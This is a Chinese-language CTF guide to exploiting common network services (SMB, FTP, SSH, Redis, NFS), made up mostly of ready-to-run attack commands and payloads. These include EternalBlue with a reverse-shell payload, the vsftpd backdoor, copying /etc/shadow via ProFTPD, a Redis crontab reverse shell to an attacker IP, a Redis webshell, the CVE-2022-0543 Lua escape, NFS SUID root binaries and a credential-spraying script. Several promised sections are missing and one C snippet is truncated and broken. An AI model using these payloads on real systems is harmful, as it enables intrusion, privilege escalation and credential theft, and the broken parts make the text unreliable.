# 常见服务漏洞利用

## 1. 概述

网络服务是CTF渗透中的核心攻击面。大量CTF题目（尤其是Attack-Defense模式的"维护服务"）基于存在已知漏洞或配置缺陷的网络服务设计。本节系统覆盖SMB、FTP、SSH、Redis、MySQL、MongoDB、NFS、SNMP八大常见服务的漏洞利用方法，并提供可直接在CTF场景中执行的命令和Payload。

## 2. 核心原理

### 2.1 服务漏洞分类

| 类别 | 描述 | 典型示例 |
|------|------|---------|
| 认证绕过 | 弱密码/默认凭证/空密码 | Redis无密码、MongoDB匿名访问 |
| 配置缺陷 | 过于宽松的权限配置 | FTP匿名上传、NFS no_root_squash |
| 已知CVE | 软件本身存在可RCE漏洞 | SMB永恒之蓝(MS17-010)、vsftpd 2.3.4后门 |
| 协议缺陷 | 协议本身设计问题 | SMB签名禁用(中继攻击)、SNMP v1/v2明文community |
| 信息泄露 | 服务泄漏敏感数据 | SNMP public community strings、SMB空会话枚举 |

### 2.2 CTF服务优先级矩阵

```
高价值服务: SMB(445) > Redis(6379) > MySQL(3306) > SSH(22)
中价值服务: NFS(2049) > FTP(21) > MongoDB(27017)
低价值服务: SNMP(161) > Telnet(23) > RDP(3389)
评估因素: 可直接RCE > 信息泄露 > 仅认证绕过 > 需结合其他
```

## 3. 各服务漏洞利用详解

### 3.1 SMB (445/TCP) — Server Message Block

SMB是Windows网络文件共享协议，也是CTF中最主要的内网攻击面之一。

**版本识别：**
```bash
# Nmap SMB扫描
nmap -p 139,445 --script=smb-os-discovery,smb-protocols,smb-security-mode 10.10.10.5

# nmap SMB漏洞脚本组
nmap -p 445 --script=smb-vuln-* 10.10.10.0/24

# SMB版本探测
nmap -p 445 --script=smb-protocols 10.10.10.5
# 结果: SMBv1 enabled → 可能存在永恒之蓝

# 手动版本探测
smbclient -L //10.10.10.5 -N
```

**SMB空会话（Null Session）信息收集：**
```bash
# 枚举共享
smbclient -L //10.10.10.5 -N
smbclient -L //10.10.10.5 -U ""  # Windows旧版本

# enum4linux — SMB一站式枚举
enum4linux -a 10.10.10.5
enum4linux -U 10.10.10.5  # 用户列表
enum4linux -S 10.10.10.5  # 共享列表
enum4linux -P 10.10.10.5  # 密码策略
enum4linux -o 10.10.10.5  # OS信息
enum4linux -n 10.10.10.5  # NetBIOS名

# smbmap — 检查共享权限
smbmap -H 10.10.10.5
smbmap -H 10.10.10.5 -u "guest" -p ""
smbmap -H 10.10.10.5 -u "Administrator" -p "Password123"
smbmap -H 10.10.10.5 -R  # 递归列出所有文件

# 连接共享
smbclient //10.10.10.5/share -N  # 匿名连接
smbclient //10.10.10.5/C$ -U "DOMAIN/Administrator%Password123"  # 认证连接
# 连接后查看和下载文件
smb: \> dir
smb: \> get flag.txt
smb: \> cd Web
```

**SMB漏洞利用：**
```bash
# EternalBlue (MS17-010) — CVE-2017-0144
# 检测漏洞
nmap -p 445 --script=smb-vuln-ms17-010 10.10.10.5

# Metasploit利用（离线环境）
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set LHOST 10.10.10.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# 使用AutoBlue (手动利用)
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
# 生成shellcode
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=4444 \
         -f raw -o sc.bin EXITFUNC=thread
# 使用zzz_exploit.py
python3 zzz_exploit.py 10.10.10.5 sc.bin
```

**SMB共享文件传输（内网横向移动）：**
```bash
# 挂载SMB共享到本地（Linux smbmount）
sudo mount -t cifs //10.10.10.5/C$ /mnt/smb -o username=Administrator,password=Password123
# 或使用mount.cifs
sudo mount.cifs //10.10.10.5/Share /mnt/smb -o username=guest,rw

# 使用Impacket的smbclient.py
python3 /usr/share/doc/python3-impacket/examples/smbclient.py DOMAIN/user:password@10.10.10.5
```

**SMB签名禁用检测：**
```bash
# 查找未要求SMB签名的目标（中继攻击前置）
nmap -p 445 --script=smb-security-mode 10.10.10.0/24 -oN smb_signing.txt
# 查找 "Message signing enabled but not required" 
grep -B5 "not required" smb_signing.txt
```

### 3.2 FTP (21/TCP)

```bash
# FTP匿名登录
ftp 10.10.10.5
# Name: anonymous 或 ftp
# Password: 任意（回车即可）

# 或者
wget -r ftp://anonymous:@10.10.10.5/

# 枚举FTP用户 (ftp-user-enum)
ftp-user-enum -U users.txt -t 10.10.10.5

# 暴力破解
hydra -L users.txt -P passwords.txt ftp://10.10.10.5

# FTP匿名上传利用
# 如果匿名用户有写入权限，且Web根目录可达
ftp> cd /var/www/html
ftp> put shell.php
# 然后访问 http://10.10.10.5/shell.php

# vsftpd 2.3.4后门利用 (CVE-2011-2523)
# 检测版本
nc 10.10.10.5 21

# 利用（在用户名中加入:)笑脸字符
ftp 10.10.10.5
Name: any:)  # 冒号+右括号触发后门
# 后门在6200端口开启root shell
nc 10.10.10.5 6200
id  # root

# ProFTPD 1.3.5 mod_copy RCE
# 利用mod_copy的CPFR/CPTO命令
nc 10.10.10.5 21
# 复制公钥
SITE CPFR /home/user/.ssh/authorized_keys
SITE CPTO /var/www/html/pubkeys.txt
# 或直接复制/etc/shadow
SITE CPFR /etc/shadow
SITE CPTO /var/www/html/shadow.txt
```

### 3.3 SSH (22/TCP)

```bash
# SSH版本信息
nc 10.10.10.5 22
ssh -v 10.10.10.5 2>&1 | grep -E "Remote|OpenSSH"

# SSH弱密码爆破
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5
hydra -L users.txt -P passwords.txt -t 4 ssh://10.10.10.5
medusa -h 10.10.10.5 -U users.txt -P passwords.txt -M ssh

# 利用known_hosts发现其他主机
cat ~/.ssh/known_hosts
# 这些是之前连接过的主机

# SSH密钥横向移动
# 一旦获得某用户权限，检查密钥
ls -la ~/.ssh/
cat ~/.ssh/id_rsa
# 使用此密钥连接其他内部主机
for host in $(arp -a | grep -oP '\d+\.\d+\.\d+\.\d+'); do
    ssh -o StrictHostKeyChecking=no -i id_rsa root@$host 2>/dev/null
done

# SSH隧道技术
# 本地端口转发 (将远程端口映射到本地)
ssh -L 8080:internal_host:80 user@10.10.10.5
# 现在访问 localhost:8080 等于访问 internal_host:80

# 远程端口转发 (将本地端口反向映射到远程攻击机)
ssh -R 8888:localhost:22 attacker@YOUR_SERVER
# 在YOUR_SERVER上可以 ssh -p 8888 user@localhost 连接到被控机器

# 动态端口转发 (SOCKS代理)
ssh -D 1080 user@10.10.10.5
# 配置浏览器或proxychains使用 socks5://127.0.0.1:1080

# SSH获取交互式Shell
ssh user@10.10.10.5 -t "bash --noprofile --norc"
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+z (后台SSH)
stty raw -echo; fg; export TERM=xterm

# SSH命令执行（不登录）
ssh user@10.10.10.5 "id; uname -a; ls /flag*"
```

### 3.4 Redis (6379/TCP)

Redis是CTF中最高价值的攻击目标之一，因为其经常被配置为无密码或弱密码。

```bash
# Redis未授权访问检测
redis-cli -h 10.10.10.5 PING
# 返回 PONG → 未授权（无需密码）

nc -nv 10.10.10.5 6379
# 输入 PING → 返回 +PONG

# 信息收集
redis-cli -h 10.10.10.5 INFO
redis-cli -h 10.10.10.5 CONFIG GET *
redis-cli -h 10.10.10.5 CLIENT LIST
redis-cli -h 10.10.10.5 DBSIZE

# 遍历所有Key
redis-cli -h 10.10.10.5 KEYS '*'
redis-cli -h 10.10.10.5 --scan

# 读取数据
redis-cli -h 10.10.10.5 GET keyname
redis-cli -h 10.10.10.5 HGETALL hashkey
redis-cli -h 10.10.10.5 LRANGE listkey 0 -1

# === Redis写SSH公钥提权 ===
# 条件：Redis以root运行，/root/.ssh/目录存在
# 1. 生成密钥对
ssh-keygen -t rsa -f redis_key -N ""

# 2. 写入公钥到Redis
(echo -e "\n\n"; cat redis_key.pub; echo -e "\n\n") > redis_pub_tmp.txt
cat redis_pub_tmp.txt | redis-cli -h 10.10.10.5 -x SET sshkey

# 3. 配置Redis dir和dbfilename
redis-cli -h 10.10.10.5 CONFIG SET dir /root/.ssh/
redis-cli -h 10.10.10.5 CONFIG SET dbfilename authorized_keys

# 4. 保存
redis-cli -h 10.10.10.5 SAVE

# 5. SSH连接
ssh -i redis_key root@10.10.10.5

# === Redis写Crontab反弹Shell ===
redis-cli -h 10.10.10.5 CONFIG SET dir /var/spool/cron/crontabs/
redis-cli -h 10.10.10.5 CONFIG SET dbfilename root
redis-cli -h 10.10.10.5 SET crontab \
    "\n\n*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.100/4444 0>&1'\n\n"
redis-cli -h 10.10.10.5 SAVE

# === Redis写Webshell ===
# 条件：知道Web根目录路径
redis-cli -h 10.10.10.5 CONFIG SET dir /var/www/html/
redis-cli -h 10.10.10.5 CONFIG SET dbfilename shell.php
redis-cli -h 10.10.10.5 SET webshell \
    "<?php system(\$_GET['cmd']); ?>"
redis-cli -h 10.10.10.5 SAVE
# 访问 http://10.10.10.5/shell.php?cmd=id

# === Redis Lua沙盒逃逸 (CVE-2022-0543) ===
# 检测Redis版本
redis-cli -h 10.10.10.5 INFO server | grep redis_version
# < 7.0.0 and >= 2.2.0 可能受影响
# 利用
redis-cli -h 10.10.10.5 EVAL \
    "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id', 'r'); local res = f:read('*a'); f:close(); return res" 0

# === Redis爆破（若有密码） ===
hydra -P /usr/share/wordlists/rockyou.txt redis://10.10.10.5

# === 使用redis-rogue-server获取交互式Shell ===
# 原理：主从复制RCE
# 工具: https://github.com/n0b0dyCN/redis-rogue-server
python3 redis-rogue-server.py --rhost 10.10.10.5 --lhost 10.10.10.100
# 进入交互模式:
# > MODULE LOAD /path/to/exp.so
# > system.exec "id"
```

### 3.7 NFS (2049/TCP + rpcbind 111/TCP)

NFS (Network File System) 在Linux/Unix环境中广泛用作网络文件共享。

```bash
# NFS共享发现
showmount -e 10.10.10.5  # 列出所有导出共享
rpcinfo -p 10.10.10.5 | grep nfs  # 确认NFS版本

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.5

# 挂载NFS共享
mkdir /mnt/nfs
mount -t nfs 10.10.10.5:/exported/path /mnt/nfs -o nolock
mount -t nfs 10.10.10.5:/home /mnt/nfs -o nolock,vers=3  # 指定版本

# NFS no_root_squash提权
# 条件：导出的共享没有启用root_squash（no_root_squash配置）
# 1. 攻击者在本地创建SUID bash
# 以root身份在执行NFS挂载的主机上
cat > /tmp/exploit.c << 'EOF'
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF
gcc /tmp/exploit.c -o /tmp/exploit
chmod 4777 /tmp/exploit

# 2. 通过NFS复制到远程共享
cp /tmp/exploit /mnt/nfs/

# 3. 在目标机器上执行（如果共享目录可执行）
# /mnt/nfs/exploit → 获得root

# 或者：通过NFS修改用户文件
# 挂载目标/home后，修改.ssh/authorized_keys
mkdir -p /mnt/nfs/user/.ssh
cat ~/.ssh/id_rsa.pub >> /mnt/nfs/user/.ssh/authorized_keys
ssh user@10.10.10.5

# /etc/exports 典型配置分析
cat /etc/exports
# /shared 10.10.10.0/24(rw,sync,no_root_squash)
# → no_root_squash: root用户不会被映射为nobody，且保留root权限
# → rw: 读写
# → 攻击者可创建SUID文件并在目标上执行
```

## 4. 服务漏洞快速检测脚本

```bash
#!/bin/bash
# service_scan.sh - CTF服务漏洞快速检测
TARGET=$1
mkdir -p "svc_scan_$TARGET"

echo "[*] Scanning $TARGET for common service vulnerabilities"

# 1. 端口快速探测
rustscan -a $TARGET --range 1-10000 -b 3000 --greppable > "svc_scan_$TARGET/ports.txt"

# 2. 检测关键端口并进行漏洞利用尝试
# FTP (21)
if grep -q ":21" "svc_scan_$TARGET/ports.txt"; then
    echo "[+] FTP found, testing anonymous..."
    wget -q --tries=1 --timeout=5 ftp://anonymous:@$TARGET/ -O /dev/null && \
        echo "[!] FTP ANONYMOUS LOGIN ALLOWED" | tee -a "svc_scan_$TARGET/findings.txt"
fi

# SSH (22)
if grep -q ":22" "svc_scan_$TARGET/ports.txt"; then
    echo "[+] SSH found, testing common creds..."
    for user in root admin ubuntu; do
        for pass in toor admin password ubuntu; do
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
                $user@$TARGET "id" 2>/dev/null && \
                echo "[!] SSH LOGIN: $user:$pass" | tee -a "svc_scan_$TARGET/findings.txt"
        done
    done
fi

# SMB (445)
if grep -q ":445" "svc_scan_$TARGET/ports.txt"; then
    echo "[+] SMB found, testing null session..."
    smbclient -L //$TARGET -N 2>/dev/null && \
        echo "[!] SMB NULL SESSION ALLOWED" | tee -a "svc_scan_$TARGET/findings.txt"
fi

# Redis (6379)
if grep -q ":6379" "svc_scan_$TARGET/ports.txt"; then
    echo "[+] Redis found, testing unauthorized access..."
    (echo PING; sleep 1) | nc -w 2 $TARGET 6379 | grep -q PONG && \
        echo "[!] REDIS UNAUTHORIZED ACCESS" | tee -a "svc_scan_$TARGET/findings.txt"
fi

# MySQL (3306)
if grep -q ":3306" "svc_scan_$TARGET/ports.txt"; then
    echo "[+] MySQL found, testing root no pass..."
    mysql -h $TARGET -u root -e "SELECT VERSION();" 2>/dev/null && \
        echo "[!] MYSQL ROOT NO PASSWORD" | tee -a "svc_scan_$TARGET/findings.txt"
fi

echo "[*] Scan complete. Check svc_scan_$TARGET/findings.txt"
```

### 5.2 NFS no_root_squash + SUID链

```bash

#include <unistd.h>

    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
EOF
gcc /tmp/nfs_suid.c -o /mnt/nfs/user1/suid_shell

mkdir -p /mnt/nfs/user1/.ssh

cp nfs_key.pub /mnt/nfs/user1/.ssh/authorized_keys
```

## 6. 常见误区与注意事项

- **误区：Redis未授权只能写WebShell/SSH密钥。** 也应注意利用Lua沙盒逃逸(CVE-2022-0543)、主从复制RCE等更隐蔽的方式。
- **误区：SNMP只有public能获取信息。** 许多管理员使用private作为读写community，可修改设备配置。
- **误区：MySQL root不能写文件。** 即使secure_file_priv限制了OUTFILE，还有general_log方法可以写文件。
- **注意：FTP passive模式需要开放额外端口（数据端口），防火墙规则可能影响FTP利用。**
- **注意：NFS v4默认使用Kerberos认证，可能无法直接匿名挂载，尝试vers=3降级。**

## 7. 相关知识点

- **IPMI (623/udp)：** 服务器远程管理，常见默认密码admin/admin，漏洞利用
- **RDP (3389/tcp)：** Windows远程桌面，BlueKeep (CVE-2019-0708) 漏洞
- **VNC (5900/tcp)：** 常见无密码或弱密码配置
- **Telnet (23/tcp)：** 明文传输，常见默认密码登录
- **PostgreSQL (5432/tcp)：** RCE via COPY FROM PROGRAM
- **MS-SQL (1433/tcp)：** xp_cmdshell执行命令，Linked Server横向移动
- **Elasticsearch (9200/tcp)：** Groovy脚本RCE (CVE-2015-1427)
- **Jenkins (8080/tcp)：** Script Console RCE，凭证泄露
